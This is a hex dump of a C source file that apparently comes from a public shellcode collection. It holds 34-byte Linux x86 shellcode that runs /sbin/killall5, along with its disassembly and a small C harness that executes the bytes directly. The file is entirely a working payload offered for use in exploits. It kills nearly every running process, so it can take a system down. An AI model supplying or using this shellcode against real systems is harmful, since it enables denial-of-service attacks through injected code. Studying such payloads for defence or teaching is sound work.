00000000  2f 2a 0d 0a 20 20 20 4c  69 6e 75 78 20 78 38 36  |/*..   Linux x86|
00000010  20 7c 20 6b 69 6c 6c 61  6c 6c 35 0d 0a 20 20 20  | | killall5..   |
00000020  53 68 65 6c 6c 63 6f 64  65 20 33 34 20 62 79 74  |Shellcode 34 byt|
00000030  65 73 0d 0a 20 20 20 41  75 74 68 6f 72 3a 20 4a  |es..   Author: J|
00000040  6f 6e 61 74 68 61 6e 20  53 61 6c 77 61 6e 20 6a  |onathan Salwan j|
00000050  73 2e 72 61 63 2e 70 72  6f 6a 65 74 20 5b 41 54  |s.rac.projet [AT|
00000060  5d 20 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 20 20 20  |] gmail.com..   |
00000070  57 65 62 3a 20 68 74 74  70 3a 2f 2f 77 77 77 2e  |Web: http://www.|
00000080  73 68 65 6c 6c 2d 73 74  6f 72 6d 2e 6f 72 67 0d  |shell-storm.org.|
00000090  0a 0d 0a 20 20 20 6b 69  6c 6c 61 6c 6c 35 20 69  |...   killall5 i|
000000a0  73 20 74 68 65 20 53 79  73 74 65 6d 56 20 6b 69  |s the SystemV ki|
000000b0  6c 6c 61 6c 6c 20 63 6f  6d 6d 61 6e 64 2e 20 49  |llall command. I|
000000c0  74 20 73 65 6e 64 73 20  61 20 73 69 67 6e 61 6c  |t sends a signal|
000000d0  20 74 6f 20 61 6c 6c 20  70 72 6f 63 65 73 73 65  | to all processe|
000000e0  73 20 0d 0a 20 20 20 65  78 63 65 70 74 20 74 68  |s ..   except th|
000000f0  65 20 70 72 6f 63 65 73  73 65 73 20 69 6e 20 69  |e processes in i|
00000100  74 73 20 6f 77 6e 20 73  65 73 73 69 6f 6e 2c 20  |ts own session, |
00000110  73 6f 20 69 74 20 77 6f  6e 27 74 20 6b 69 6c 6c  |so it won't kill|
00000120  20 74 68 65 20 73 68 65  6c 6c 20 74 68 61 74 20  | the shell that |
00000130  69 73 20 0d 0a 20 20 20  72 75 6e 6e 69 6e 67 20  |is ..   running |
00000140  74 68 65 20 73 63 72 69  70 74 20 69 74 20 77 61  |the script it wa|
00000150  73 20 63 61 6c 6c 65 64  20 66 72 6f 6d 2e 20 49  |s called from. I|
00000160  74 73 20 70 72 69 6d 61  72 79 20 28 6f 6e 6c 79  |ts primary (only|
00000170  29 20 75 73 65 20 69 73  20 69 6e 20 74 68 65 20  |) use is in the |
00000180  72 63 20 0d 0a 20 20 20  73 63 72 69 70 74 73 20  |rc ..   scripts |
00000190  66 6f 75 6e 64 20 69 6e  20 74 68 65 20 2f 65 74  |found in the /et|
000001a0  63 2f 69 6e 69 74 2e 64  20 64 69 72 65 63 74 6f  |c/init.d directo|
000001b0  72 79 2e 0d 0a 0d 0a 0d  0a 44 69 73 61 73 73 65  |ry.......Disasse|
000001c0  6d 62 6c 79 20 6f 66 20  73 65 63 74 69 6f 6e 20  |mbly of section |
000001d0  2e 74 65 78 74 3a 0d 0a  0d 0a 30 38 30 34 38 30  |.text:....080480|
000001e0  35 34 20 3c 2e 74 65 78  74 3e 3a 0d 0a 20 38 30  |54 <.text>:.. 80|
000001f0  34 38 30 35 34 3a 20 20  20 20 20 20 20 33 31 20  |48054:       31 |
00000200  63 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0              |
00000210  20 20 20 20 20 78 6f 72  20 20 20 20 25 65 61 78  |     xor    %eax|
00000220  2c 25 65 61 78 0d 0a 20  38 30 34 38 30 35 36 3a  |,%eax.. 8048056:|
00000230  20 20 20 20 20 20 20 35  30 20 20 20 20 20 20 20  |       50       |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000250  75 73 68 20 20 20 25 65  61 78 0d 0a 20 38 30 34  |ush   %eax.. 804|
00000260  38 30 35 37 3a 20 20 20  20 20 20 20 36 36 20 36  |8057:       66 6|
00000270  38 20 36 63 20 33 35 20  20 20 20 20 20 20 20 20  |8 6c 35         |
00000280  20 20 20 20 70 75 73 68  77 20 20 24 30 78 33 35  |    pushw  $0x35|
00000290  36 63 0d 0a 20 38 30 34  38 30 35 62 3a 20 20 20  |6c.. 804805b:   |
000002a0  20 20 20 20 36 38 20 36  63 20 36 63 20 36 31 20  |    68 6c 6c 61 |
000002b0  36 63 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |6c          push|
000002c0  20 20 20 24 30 78 36 63  36 31 36 63 36 63 0d 0a  |   $0x6c616c6c..|
000002d0  20 38 30 34 38 30 36 30  3a 20 20 20 20 20 20 20  | 8048060:       |
000002e0  36 38 20 36 65 20 32 66  20 36 62 20 36 39 20 20  |68 6e 2f 6b 69  |
000002f0  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 24  |        push   $|
00000300  30 78 36 39 36 62 32 66  36 65 0d 0a 20 38 30 34  |0x696b2f6e.. 804|
00000310  38 30 36 35 3a 20 20 20  20 20 20 20 36 38 20 32  |8065:       68 2|
00000320  66 20 37 33 20 36 32 20  36 39 20 20 20 20 20 20  |f 73 62 69      |
00000330  20 20 20 20 70 75 73 68  20 20 20 24 30 78 36 39  |    push   $0x69|
00000340  36 32 37 33 32 66 0d 0a  20 38 30 34 38 30 36 61  |62732f.. 804806a|
00000350  3a 20 20 20 20 20 20 20  38 39 20 65 33 20 20 20  |:       89 e3   |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 62 78  |mov    %esp,%ebx|
00000380  0d 0a 20 38 30 34 38 30  36 63 3a 20 20 20 20 20  |.. 804806c:     |
00000390  20 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |  50            |
000003a0  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
000003b0  20 25 65 61 78 0d 0a 20  38 30 34 38 30 36 64 3a  | %eax.. 804806d:|
000003c0  20 20 20 20 20 20 20 38  39 20 65 32 20 20 20 20  |       89 e2    |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
000003e0  6f 76 20 20 20 20 25 65  73 70 2c 25 65 64 78 0d  |ov    %esp,%edx.|
000003f0  0a 20 38 30 34 38 30 36  66 3a 20 20 20 20 20 20  |. 804806f:      |
00000400  20 35 33 20 20 20 20 20  20 20 20 20 20 20 20 20  | 53             |
00000410  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000420  25 65 62 78 0d 0a 20 38  30 34 38 30 37 30 3a 20  |%ebx.. 8048070: |
00000430  20 20 20 20 20 20 38 39  20 65 31 20 20 20 20 20  |      89 e1     |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000450  76 20 20 20 20 25 65 73  70 2c 25 65 63 78 0d 0a  |v    %esp,%ecx..|
00000460  20 38 30 34 38 30 37 32  3a 20 20 20 20 20 20 20  | 8048072:       |
00000470  62 30 20 30 62 20 20 20  20 20 20 20 20 20 20 20  |b0 0b           |
00000480  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000490  30 78 62 2c 25 61 6c 0d  0a 20 38 30 34 38 30 37  |0xb,%al.. 804807|
000004a0  34 3a 20 20 20 20 20 20  20 63 64 20 38 30 20 20  |4:       cd 80  |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
000004d0  0a 2a 2f 0d 0a 0d 0a 23  69 6e 63 6c 75 64 65 20  |.*/....#include |
000004e0  22 73 74 64 69 6f 2e 68  22 0d 0a 0d 0a 69 6e 74  |"stdio.h"....int|
000004f0  20 6d 61 69 6e 28 69 6e  74 20 61 72 67 63 2c 20  | main(int argc, |
00000500  63 68 61 72 20 2a 61 72  67 76 5b 5d 29 0d 0a 7b  |char *argv[])..{|
00000510  0d 0a 0d 0a 09 63 68 61  72 20 73 68 65 6c 6c 63  |.....char shellc|
00000520  6f 64 65 5b 5d 20 3d 20  09 22 5c 78 33 31 5c 78  |ode[] = ."\x31\x|
00000530  63 30 5c 78 35 30 5c 78  36 36 5c 78 36 38 5c 78  |c0\x50\x66\x68\x|
00000540  36 63 22 0d 0a 09 09 09  09 22 5c 78 33 35 5c 78  |6c"......"\x35\x|
00000550  36 38 5c 78 36 63 5c 78  36 63 5c 78 36 31 5c 78  |68\x6c\x6c\x61\x|
00000560  36 63 22 0d 0a 09 09 09  09 22 5c 78 36 38 5c 78  |6c"......"\x68\x|
00000570  36 65 5c 78 32 66 5c 78  36 62 5c 78 36 39 5c 78  |6e\x2f\x6b\x69\x|
00000580  36 38 22 0d 0a 09 09 09  09 22 5c 78 32 66 5c 78  |68"......"\x2f\x|
00000590  37 33 5c 78 36 32 5c 78  36 39 5c 78 38 39 5c 78  |73\x62\x69\x89\x|
000005a0  65 33 22 0d 0a 09 09 09  09 22 5c 78 35 30 5c 78  |e3"......"\x50\x|
000005b0  38 39 5c 78 65 32 5c 78  35 33 5c 78 38 39 5c 78  |89\xe2\x53\x89\x|
000005c0  65 31 22 0d 0a 09 09 09  09 22 5c 78 62 30 5c 78  |e1"......"\xb0\x|
000005d0  30 62 5c 78 63 64 5c 78  38 30 22 3b 0d 0a 0d 0a  |0b\xcd\x80";....|
000005e0  09 70 72 69 6e 74 66 28  22 4c 65 6e 67 74 68 3a  |.printf("Length:|
000005f0  20 25 64 5c 6e 22 2c 73  74 72 6c 65 6e 28 73 68  | %d\n",strlen(sh|
00000600  65 6c 6c 63 6f 64 65 29  29 3b 0d 0a 09 28 2a 28  |ellcode));...(*(|
00000610  76 6f 69 64 28 2a 29 28  29 29 20 73 68 65 6c 6c  |void(*)()) shell|
00000620  63 6f 64 65 29 28 29 3b  0d 0a 09 0d 0a 09 72 65  |code)();......re|
00000630  74 75 72 6e 20 30 3b 0d  0a 7d                    |turn 0;..}|
0000063a
